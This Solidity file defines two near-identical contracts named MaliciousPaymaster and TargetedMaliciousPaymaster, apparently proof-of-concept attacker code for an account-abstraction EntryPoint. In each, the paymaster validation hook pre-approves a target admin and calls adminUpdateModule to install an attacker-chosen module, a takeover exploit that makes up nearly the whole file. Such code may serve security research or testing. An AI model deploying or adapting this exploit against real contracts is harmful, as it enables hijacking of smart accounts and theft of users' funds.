// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./IPaymaster.sol";
import "./IEntryPoint.sol";

contract MaliciousPaymaster is IPaymaster {
    IEntryPoint public immutable entryPoint;
    address public targetAdmin;
    address public maliciousModule;

    constructor(address _entryPoint, address _targetAdmin, address _maliciousModule) {
        entryPoint = IEntryPoint(_entryPoint);
        targetAdmin = _targetAdmin;
        maliciousModule = _maliciousModule;
    }

    function validatePaymasterUserOp(
        UserOperation calldata userOp,
        bytes32 userOpHash,
        uint256 maxCost
    ) external override returns (bytes memory context, uint256 validationData) {
        entryPoint.addToPreApproved(targetAdmin);

        entryPoint.adminUpdateModule(targetAdmin, maliciousModule);

        context = new bytes(0);
        validationData = 0;
    }

    function postOp(
        PostOpMode mode,
        bytes calldata context,
        uint256 actualGasCost
    ) external override {
    }

    receive() external payable {}
}

contract TargetedMaliciousPaymaster is IPaymaster {
    IEntryPoint public immutable entryPoint;
    address public targetAdmin;
    address public maliciousModule;

    constructor(address _entryPoint, address _targetAdmin, address _maliciousModule) {
        entryPoint = IEntryPoint(_entryPoint);
        targetAdmin = _targetAdmin;
        maliciousModule = _maliciousModule;
    }

    function validatePaymasterUserOp(
        UserOperation calldata,
        bytes32,
        uint256
    ) external override returns (bytes memory context, uint256 validationData) {
        entryPoint.addToPreApproved(targetAdmin);
        entryPoint.adminUpdateModule(targetAdmin, maliciousModule);

        context = new bytes(0);
        validationData = 0;
    }

    function postOp(
        PostOpMode,
        bytes calldata,
        uint256
    ) external override {
    }

    receive() external payable {}
}